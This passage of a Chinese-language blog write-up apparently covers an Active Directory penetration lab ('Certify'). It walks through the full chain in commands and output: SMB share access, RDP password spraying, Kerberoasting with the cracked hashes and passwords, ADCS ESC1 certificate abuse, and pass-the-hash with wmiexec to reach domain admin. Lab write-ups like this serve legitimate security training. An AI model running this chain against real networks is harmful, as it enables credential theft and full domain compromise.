+</span></span></code></pre></td></tr></table></div></div><p>确实开启了445端口，用<code>smbclient</code>链接一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 impacket-smbclient 172.22.9.47
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>shares
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>use fileshare
+</span></span><span class=line><span class=cl><span class=nb>cd</span> secret
+</span></span><span class=line><span class=cl>cat flag02.txt
+</span></span></code></pre></td></tr></table></div></div><h2 id=flag3flag4>flag3&&amp;flag4</h2><p>同时看到了一个数据库</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> ..
+</span></span><span class=line><span class=cl>get personnel.db
+</span></span></code></pre></td></tr></table></div></div><p>放到Navicat里面看一下</p><p><img src=/p/spring-autumn-mirror-certify/4.png width=1277 height=895 loading=lazy alt=1></p><p><img src=/p/spring-autumn-mirror-certify/5.png width=493 height=353 loading=lazy alt=1></p><p>直接密码喷洒攻击，看看哪个用户可以登录到域内机器，导出之后是带引号的，一行一个数据，需要处理一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat xr_users.txt <span class=p>|</span> sed <span class=s1>&#39;s/&#34;//g&#39;</span> &gt; passwords.txt
+</span></span><span class=line><span class=cl>cat xr_salary.txt <span class=p>|</span> sed <span class=s1>&#39;s/&#34;//g&#39;</span> &gt; usernames.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>proxychains4 netexec rdp 172.22.9.26 -u usernames.txt -p passwords.txt --continue-on-success &gt; rdp_results.txt 2&gt;<span class=p>&amp;</span><span class=m>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>grep <span class=s2>&#34;\[+\]&#34;</span> rdp_results.txt
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/spring-autumn-mirror-certify/6.png width=875 height=86 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>xiaorang.lab\liupeng:fiAzGwEMgTY
+</span></span><span class=line><span class=cl>xiaorang.lab\zhangjian:i9XDE02pLVf
+</span></span></code></pre></td></tr></table></div></div><p>并不是有效的用户密码，但是证明了存在这样的域用户，那就可以请求TGS票据，也就是<strong>Kerberoasting攻击</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf
+</span></span></code></pre></td></tr></table></div></div><p>得到两份hash，破解即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>zhangxia<span class=nv>$XIAORANG</span>.LAB<span class=nv>$xiaorang</span>.lab/zhangxia*<span class=nv>$2</span>c381ee85ea38fba57f0b13d8bec4792<span class=nv>$36</span>ec4c8a84f332190a45b83d18aeb8389f138095424ace3d6b01b55355758bfb05297ac278c7141fb93655e743323c7ecf0bde480c0a5be41fbc86f21619af15f6b5a8eca85e8837566b966546e711c15f6cd8455462a1869c0ce1e4e202b623a2f32a644609208e1ea884df08f4e6acfbc204d99a56e5fb4e97a712e22d8697fc40d954926fd748640557deb840e882c4d51a5f32f65ccfbbc7e5965967ff36eb4428cd8fa2170c3c3f562ee2d295d209839e9b5dca904364bd8fbf926dbbf6553a89b9526f9b59f04033f6f5f9ba8d57bdbd323678f76791351181782cf032458ae6149566f0a181c6d5baf5f07a8868ac7318a560536c6570c8b5e2f76ee91f4ed8ef6c1cd1933f7b73b0fe28ce00f54350cad7cfb44691ae87f795f2bc324b599d8bd07ab77c8582cbe3943935f01daa6bbfa70911cc62c272f8376c131e6d884d2de4fe2e5406c528d762e4f7e9fbcc2cdc67485eb503ae68496e2f7fcfe7d4c1c7644b5530960f1551211f5092bf0489fbbdac052d86a6090da290816fba814779ffb55c86a5350264a9d06a974bccff4e1644ff28c20fb8d8cf171b555b1dbb4bccf49fe9f1404ed468818e718fae0192e298251c05e971a378179311fe4b64e6b4bab5634f2dbdb988841b7e73a58e5d4c0c06d3fe7b934c108a8f4f998657129de1207550b758060ba153bea5beb12fcabda755e2d1476cbe6b134cf5b8ed21dae1ad29c212b1a3eb04684c262eefd0105fa7a089416352fa92ae3036a21953b612157c425b325a3aa517e5aaace6082b1eae636a2c9ece677442af4139f52823f0fcb407998b43050c2b960122b17b872cae2c0e35114757d35c30af3485e2ce2ee94068f38aa4f00ec84b1955ae1c406fa5d8eb3353cb3c22f9921017b17dd55308e740ef832f2128c6de1486093cd8dc78ff8d8de360abea179fa5e5ddd17c2795e56f1236c426ed07b4c4e68f3f08999da95cacd7b1d109f7ebf01b2425b458286e22a6a15b2a39be0df801a7ff75527e665772e89404ce39779051c22601c346e31a5f3af465b2d965f04ccc3d276e8bb623bd985fb8d40bca206da38dcba4e5dad760d4a257b9e6da74dc868c61732063e31e8b5a6e33bb546df0991f8829c08fa0b8c9720151be5a0d2feaecfa10d6c2d6f0144698118824885c40f230d3b61c72449fdc745893046a022f0db19146964107af91917819bbce2ba9325ba8dead142e85b89e3883fd7197d3b563021989b134648e9de36eb9bfd34126f23061d2cd4077d400b7e436d0924dc981b72ef43c103d25cacb488ccf95ec1cb2cdac706f245248e985938d603806ef49dfe92262f9694f5f2a6890df3b96da19d4dc77e852563baaf52cc2ef1e4461af70288cae8df3c3fccb15eaf47cdde2a37271dbcaeac9de5fc1eb2337a813d1ee5f8b9a7959f0412d03b16f70420438e623a4dbef7fd6bb4a974e7b7a39f6a4eb1d2f6f84b57508790659e239f8bd69e99f1540dbcdf568a473
+</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>chenchen<span class=nv>$XIAORANG</span>.LAB<span class=nv>$xiaorang</span>.lab/chenchen*<span class=nv>$4</span>cbb191420cba9216660335c0a767204<span class=nv>$ed581dff63d30b0b9d77c3a54d0dff0ff4ec76edc43b45dc3d575269fe8efeb9199c98cb8fb1e3f1639dd403e6ccd790b1a5325ebb279c75089b4bea3f381f6661e8b3d3bca1008786e6af5eb230b3eb534dafa8d7ab58a30b0bcfd2a7b6e3f1fc227ec88e09f57e57d16e11167cfbe14295df98eb31353554a4008ac0ca2b176d2feab9a1d3a834ab1fd8cf8a520b893c6bbb5f1b840d231ae3d7a0c46b106115317b9b2f706b7678860726e08f65b020d4ed66f5ab120f42a9a113dcd0495925c0f52a51d10d1acc975bda9cbd252fd4a48d1f9619cdfffa1eee5fdae164c65364b50f37790f3f49f011689f568940cab29bfe231068980c341fcd65e927752a9176d6cca847fd201f13c86cda3a3e14b37fdb4d29d6dacec8302d4800c226fd5bd75f9b8640bd837167bed3266cb09debc1d53f0896c78a0610f651a2cd8cc9c356d7342fb81b540642209a9d64776deb0fdd810cad7799f6c6ab661bfbad4fc0f69e78f0da86504947b94b57c05769f930a7db923ee5c750020dcdeb986add29748fb506eb7600809457a947a7aad74c540a91cc305966d0f393c0596aa3985a5d9b41f5509f456ff71bc7b948ed5b140f4e240cae4c5be2f310747bc0b7c88ea69e5c3b23927f4944e7236814b50d96096e82644257b36e56ade710b19da5b5fa8fdda507ee1e2a3f8d28546ca300860f685fbada366c26c8ac7f8e9a2a0656c67977edd58566e9522fc1cd09e688b5bae3a768119e0a2426893bd045d53222737704a9d963f79d1eab96a8bb6a660599a1566f952ce4fef225dd242589434ee5989f593c1997a98585f98f9a68fa731e59eb1ff9b9d0cec51a9be0d4a529901ef2b3cfb6913eb4c73da0d17d5ff39252efb421fc76f0854607dbba25e9a4514775fb6c818f4c6fe9ac0a4a698da6e801194888ba1c24304b6714d24c01417c02837a8793ff3ea7420fd4da55e9063c6c254a160e1f504e3246bc767ee5ab6a257b8b202d7214b1db972e888936e24b2fba5c8609733080cb250ffb5186523a583d6803ece9970cce16d7714197d367d8d057998043de7533f59b8c106c16772549fd9fb87fd9443b5b25be7923cd480c3f29b74a62251cda90ac80f04f502e4510e53f9639d8bc303e48de54e6c000a658e0af4c2509252d51e760ad757590605291be7e63f0e635de96a181c6e73a7ae352e384092411946106b939d0d84bb1b175da4889507b24d744445b3c463a17b6a4e93f3d0c0df82c198ed19dc3e12de8b5d9970fe40d71ac29ffbf0d41feff600f2c599b199e5e3323f3aeb3bf286c1fd6bb53ca761e1323ab48cfc3d7b8a4c103bdd7a35f60687f88ccd5a53fb45745508449004165990abc5934a0d0ab90ba72a37894a2b07ae5388aa5b127f88f47303b0749906f43bf768350686b4039807e9699d03c117c88cc34f303347ccd9bbe33b48525cbdeaa3276514ebd2afed797dec40cb4eea2c286068a6e48939c8f841de72edc4ecc0671c1</span>
+</span></span></code></pre></td></tr></table></div></div><p>保存为1，利用hashcat进行爆破，<code>.\hashcat -m 13100 -a 0 1 rockyou.txt --force</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>XIAORANG.LAB<span class=se>\z</span>hangxia
+</span></span><span class=line><span class=cl>MyPass2@@6
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>XIAORANG.LAB<span class=se>\c</span>henchen
+</span></span><span class=line><span class=cl>@Passw0rd@
+</span></span></code></pre></td></tr></table></div></div><p>登录172.22.9.26，收集域内信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>cd</span> C:\Users\zhangxia\Desktop
+</span></span><span class=line><span class=cl>SharpHound.exe -c all
+</span></span></code></pre></td></tr></table></div></div><p>看到有个逆天的关系</p><p><img src=/p/spring-autumn-mirror-certify/7.png width=1159 height=885 loading=lazy alt=1></p><p>只要是在DOMAIN <a class=link href=mailto:USERS@XAIORANG.LAB>USERS@XAIORANG.LAB</a>这个组里面的用户就可以打ADCS ESC1</p><p><img src=/p/spring-autumn-mirror-certify/8.png width=1116 height=540 loading=lazy alt=1></p><p>满足条件，先查询证书模版</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/桌面/Pentest/impacket-master/examples<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ proxychains4 -q certipy-ad find -u <span class=s1>&#39;zhangxia@xiaorang.lab&#39;</span>  -password <span class=s1>&#39;MyPass2@@6&#39;</span> -dc-ip 172.22.9.7 -vulnerable -stdout
+</span></span><span class=line><span class=cl>Certipy v5.0.2 - by Oliver Lyak <span class=o>(</span>ly4k<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Finding certificate templates
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>35</span> certificate templates
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Finding certificate authorities
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>1</span> certificate authority
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>13</span> enabled certificate templates
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Finding issuance policies
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>15</span> issuance policies
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>0</span> OIDs linked to templates
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Retrieving CA configuration <span class=k>for</span> <span class=s1>&#39;xiaorang-XIAORANG-DC-CA&#39;</span> via RRP
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Successfully retrieved CA configuration <span class=k>for</span> <span class=s1>&#39;xiaorang-XIAORANG-DC-CA&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Checking web enrollment <span class=k>for</span> CA <span class=s1>&#39;xiaorang-XIAORANG-DC-CA&#39;</span> @ <span class=s1>&#39;XIAORANG-DC.xiaorang.lab&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Error checking web enrollment: <span class=o>[</span>Errno 111<span class=o>]</span> Connection refused
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Use -debug to print a stacktrace
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Enumeration output:
+</span></span><span class=line><span class=cl>Certificate Authorities
+</span></span><span class=line><span class=cl>  <span class=m>0</span>
+</span></span><span class=line><span class=cl>    CA Name                             : xiaorang-XIAORANG-DC-CA
+</span></span><span class=line><span class=cl>    DNS Name                            : XIAORANG-DC.xiaorang.lab
+</span></span><span class=line><span class=cl>    Certificate Subject                 : <span class=nv>CN</span><span class=o>=</span>xiaorang-XIAORANG-DC-CA, <span class=nv>DC</span><span class=o>=</span>xiaorang, <span class=nv>DC</span><span class=o>=</span>lab
+</span></span><span class=line><span class=cl>    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5
+</span></span><span class=line><span class=cl>    Certificate Validity Start          : 2023-07-14 04:33:21+00:00
+</span></span><span class=line><span class=cl>    Certificate Validity End            : 2028-07-14 04:43:21+00:00
+</span></span><span class=line><span class=cl>    Web Enrollment
+</span></span><span class=line><span class=cl>      HTTP
+</span></span><span class=line><span class=cl>        Enabled                         : True
+</span></span><span class=line><span class=cl>      HTTPS
+</span></span><span class=line><span class=cl>        Enabled                         : False
+</span></span><span class=line><span class=cl>    User Specified SAN                  : Disabled
+</span></span><span class=line><span class=cl>    Request Disposition                 : Issue
+</span></span><span class=line><span class=cl>    Enforce Encryption <span class=k>for</span> Requests     : Enabled
+</span></span><span class=line><span class=cl>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span class=line><span class=cl>    Permissions
+</span></span><span class=line><span class=cl>      Owner                             : XIAORANG.LAB<span class=se>\A</span>dministrators
+</span></span><span class=line><span class=cl>      Access Rights
+</span></span><span class=line><span class=cl>        ManageCa                        : XIAORANG.LAB<span class=se>\A</span>dministrators
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>        ManageCertificates              : XIAORANG.LAB<span class=se>\A</span>dministrators
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>        Enroll                          : XIAORANG.LAB<span class=se>\A</span>uthenticated Users
+</span></span><span class=line><span class=cl>    <span class=o>[</span>!<span class=o>]</span> Vulnerabilities
+</span></span><span class=line><span class=cl>      ESC8                              : Web Enrollment is enabled over HTTP.
+</span></span><span class=line><span class=cl>Certificate Templates
+</span></span><span class=line><span class=cl>  <span class=m>0</span>
+</span></span><span class=line><span class=cl>    Template Name                       : XR Manager
+</span></span><span class=line><span class=cl>    Display Name                        : XR Manager
+</span></span><span class=line><span class=cl>    Certificate Authorities             : xiaorang-XIAORANG-DC-CA
+</span></span><span class=line><span class=cl>    Enabled                             : True
+</span></span><span class=line><span class=cl>    Client Authentication               : True
+</span></span><span class=line><span class=cl>    Enrollment Agent                    : False
+</span></span><span class=line><span class=cl>    Any Purpose                         : False
+</span></span><span class=line><span class=cl>    Enrollee Supplies Subject           : True
+</span></span><span class=line><span class=cl>    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span class=line><span class=cl>    Enrollment Flag                     : IncludeSymmetricAlgorithms
+</span></span><span class=line><span class=cl>                                          PublishToDs
+</span></span><span class=line><span class=cl>    Private Key Flag                    : ExportableKey
+</span></span><span class=line><span class=cl>    Extended Key Usage                  : Encrypting File System
+</span></span><span class=line><span class=cl>                                          Secure Email
+</span></span><span class=line><span class=cl>                                          Client Authentication
+</span></span><span class=line><span class=cl>    Requires Manager Approval           : False
+</span></span><span class=line><span class=cl>    Requires Key Archival               : False
+</span></span><span class=line><span class=cl>    Authorized Signatures Required      : <span class=m>0</span>
+</span></span><span class=line><span class=cl>    Schema Version                      : <span class=m>2</span>
+</span></span><span class=line><span class=cl>    Validity Period                     : <span class=m>1</span> year
+</span></span><span class=line><span class=cl>    Renewal Period                      : <span class=m>6</span> weeks
+</span></span><span class=line><span class=cl>    Minimum RSA Key Length              : <span class=m>2048</span>
+</span></span><span class=line><span class=cl>    Template Created                    : 2023-07-14T04:51:15+00:00
+</span></span><span class=line><span class=cl>    Template Last Modified              : 2023-07-14T04:51:44+00:00
+</span></span><span class=line><span class=cl>    Permissions
+</span></span><span class=line><span class=cl>      Enrollment Permissions
+</span></span><span class=line><span class=cl>        Enrollment Rights               : XIAORANG.LAB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\D</span>omain Users
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\A</span>uthenticated Users
+</span></span><span class=line><span class=cl>      Object Control Permissions
+</span></span><span class=line><span class=cl>        Owner                           : XIAORANG.LAB<span class=se>\A</span>dministrator
+</span></span><span class=line><span class=cl>        Full Control Principals         : XIAORANG.LAB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>        Write Owner Principals          : XIAORANG.LAB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>        Write Dacl Principals           : XIAORANG.LAB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>        Write Property Enroll           : XIAORANG.LAB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\D</span>omain Users
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>    <span class=o>[</span>+<span class=o>]</span> User Enrollable Principals      : XIAORANG.LAB<span class=se>\A</span>uthenticated Users
+</span></span><span class=line><span class=cl>                                          XIAORANG.LAB<span class=se>\D</span>omain Users
+</span></span><span class=line><span class=cl>    <span class=o>[</span>!<span class=o>]</span> Vulnerabilities
+</span></span><span class=line><span class=cl>      ESC1                              : Enrollee supplies subject and template allows client authentication.
+</span></span></code></pre></td></tr></table></div></div><p>再去请求域管凭证证书pfx</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains certipy-ad req -u <span class=s1>&#39;zhangxia@xiaorang.lab&#39;</span> -p <span class=s1>&#39;MyPass2@@6&#39;</span> -target 172.22.9.7 -dc-ip 172.22.9.7 -ca <span class=s1>&#39;xiaorang-XIAORANG-DC-CA&#39;</span> -template <span class=s1>&#39;XR Manager&#39;</span> -upn <span class=s1>&#39;administrator@xiaorang.lab&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>再利用证书获取TGT</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/spring-autumn-mirror-certify/9.png width=956 height=252 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7 -codec gbk
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>cd</span> Users<span class=se>\A</span>dministrator<span class=se>\f</span>lag
+</span></span><span class=line><span class=cl><span class=nb>type</span> flag04.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>proxychains4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/Administrator@172.22.9.26 -codec gbk
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>cd</span> Users<span class=se>\A</span>dministrator<span class=se>\f</span>lag
+</span></span><span class=line><span class=cl><span class=nb>type</span> flag03.txt
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/pentest/>Pentest</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
